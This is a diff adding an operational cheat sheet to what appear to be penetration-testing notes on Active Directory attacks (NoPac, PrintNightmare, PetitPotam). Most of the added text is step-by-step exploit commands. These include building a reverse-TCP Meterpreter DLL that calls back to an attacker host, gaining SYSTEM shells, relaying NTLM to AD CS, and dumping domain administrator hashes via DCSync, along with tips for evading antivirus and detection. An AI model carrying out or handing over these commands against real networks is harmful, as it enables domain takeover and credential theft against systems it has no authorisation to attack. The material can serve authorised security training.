@@ -588,3 +588,182 @@ PetitPotam (MS-EFSRPC)
 Each of these attacks can be performed with either standard domain user access (NoPac and PrintNightmare) or without any type of authentication to the domain at all (PetitPotam), and can lead to domain compromise relatively easily. There are multiple ways to perform each attack, and we covered a few. Active Directory attacks continue to evolve, and these are surely not the last extremely high-impact attack vectors that we will see. When these types of attacks are released, we should strive to build a small lab environment to practice them in, so we are ready to use them safely and effectively in a real-world engagement should the opportunity arise. Understanding how to set up these attacks in a lab can also significantly increase our understanding of the issue and help us to better advise our clients on the impact, remediation, and detections. This was just a tiny glimpse into the world of attacking AD CS, which could be an entire module.
 
 In the next section, we'll talk through various other issues that we see from time to time in Active Directory environments that could help us further our access or lead to additional findings for our final client report.
+
+🧨 [1] NoPac (SamAccountName Spoofing)
+📄 CVEs:
+CVE-2021-42278 – Machine account name spoofing
+
+CVE-2021-42287 – Kerberos PAC confusion
+
+⚙️ Tooling:
+noPac repo
+
+Depends on Impacket – Official Repo
+
+✅ Got This, Do That (NoPac)
+Got This:
+Standard domain user
+
+ms-DS-MachineAccountQuota > 0
+
+Valid creds to DC
+
+Do That:
+🔍 Check vulnerability:
+
+bash
+Copy
+Edit
+python3 scanner.py domain/user:pass -dc-ip <DC-IP> -use-ldap
+If TGT with PAC is issued → VULNERABLE
+
+🛠 Exploit to get SYSTEM shell:
+
+bash
+Copy
+Edit
+python3 noPac.py domain/user:pass -dc-ip <DC-IP> -dc-host <DC-HOST> -shell --impersonate administrator -use-ldap
+🪪 DCSync Option:
+
+bash
+Copy
+Edit
+python3 noPac.py domain/user:pass -dc-ip <DC-IP> -dc-host <DC-HOST> --impersonate administrator -use-ldap -dump -just-dc-user domain/administrator
+🔁 IF/THEN
+IF machine account quota is 0 → ❌ Attack fails
+→ Check via LDAP or Powershell Get-ADDomain | Select ms-DS-MachineAccountQuota
+
+IF AV/EDR present → smbexec shell might fail
+→ Use stealthy method (e.g., DCSync only)
+
+🖨️ [2] PrintNightmare (CVE-2021-1675 & CVE-2021-34527)
+📄 CVEs:
+CVE-2021-1675
+
+CVE-2021-34527
+
+⚙️ Tooling:
+cube0x0’s PrintNightmare PoC
+
+cube0x0’s fork of Impacket
+
+MSFVenom + SMB Server + Metasploit handler
+
+✅ Got This, Do That (PrintNightmare)
+Got This:
+Standard domain user creds
+
+Print Spooler enabled on DC
+
+Confirm MS-RPRN exposed:
+
+bash
+Copy
+Edit
+rpcdump.py @<DC-IP> | grep MS-RPRN
+Do That:
+📦 Create malicious DLL:
+
+bash
+Copy
+Edit
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YourIP> LPORT=8080 -f dll > payload.dll
+📁 Serve DLL:
+
+bash
+Copy
+Edit
+smbserver.py -smb2support CompData /path/to/payload.dll
+🧲 Run Metasploit handler.
+
+💥 Exploit:
+
+bash
+Copy
+Edit
+python3 CVE-2021-1675.py domain/user:pass@<DC-IP> '\\<YourIP>\CompData\payload.dll'
+🔁 IF/THEN
+IF command succeeds → SYSTEM shell via Meterpreter
+
+IF spooler service is off or AV blocks DLL → FAIL
+
+🪞 [3] PetitPotam (CVE-2021-36942)
+📄 CVE:
+CVE-2021-36942
+
+⚙️ Tooling:
+PetitPotam.py
+
+PKINITtools (gettgtpkinit.py / getnthash.py)
+
+Rubeus (optional)
+
+✅ Got This, Do That (PetitPotam + ADCS Relaying)
+Got This:
+ADCS Web Enrollment enabled (CertSvc)
+
+ntlmrelayx.py
+
+No creds required
+
+Do That:
+🧱 Start NTLM relay:
+
+bash
+Copy
+Edit
+ntlmrelayx.py -debug -smb2support --target http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController
+🪞 Trigger via PetitPotam:
+
+bash
+Copy
+Edit
+python3 PetitPotam.py <YourIP> <DC-IP>
+📄 Base64 Cert will be dumped (for DC01$)
+
+🎟️ Use gettgtpkinit.py to request TGT:
+
+bash
+Copy
+Edit
+gettgtpkinit.py domain/DC01\$ -pfx-base64 <cert> dc01.ccache
+🧠 Set:
+
+bash
+Copy
+Edit
+export KRB5CCNAME=dc01.ccache
+🕵️‍♂️ DCSync:
+
+bash
+Copy
+Edit
+secretsdump.py -just-dc-user domain/administrator -k -no-pass <DC>.<domain>
+🔁 IF/THEN
+IF ADCS isn't exposed via HTTP → Relay fails
+→ Use certi to enumerate CA endpoints
+
+IF Defender active → Rubeus/SMBExec may fail
+→ Use gettgtpkinit.py + secretsdump from Linux only
+
+⚠️ OPSEC & Detection Notes
+Attack	Detection Risk	Notes
+NoPac	Medium-High	Uses SMBexec, creates services, machine objects
+PrintNightmare	Very High	Drops DLLs, shellcode, trips AV immediately
+PetitPotam	Medium → High if used w/ ADCS	Certificate usage is stealthy, NTLM relay noisy
+📚 Resources & Links
+Tool/Exploit	Link
+Impacket	https://github.com/SecureAuthCorp/impacket
+NoPac	https://github.com/Ridter/noPac
+PrintNightmare (cube0x0)	https://github.com/cube0x0/CVE-2021-1675
+Cube0x0’s Impacket Fork	https://github.com/cube0x0/impacket
+PetitPotam	https://github.com/topotam/PetitPotam
+PKINITtools	https://github.com/dirkjanm/PKINITtools
+Rubeus	https://github.com/GhostPack/Rubeus
+🧠 TL;DR Summary
+Attack	Initial Access Needed	Result	Auth Type
+NoPac	Domain User	SYSTEM shell + DCSync	Auth’d
+PrintNightmare	Domain User	SYSTEM shell (RCE)	Auth’d
+PetitPotam	None (NTLM Relay)	Cert for DC → DCSync	Unauth’d
+
+
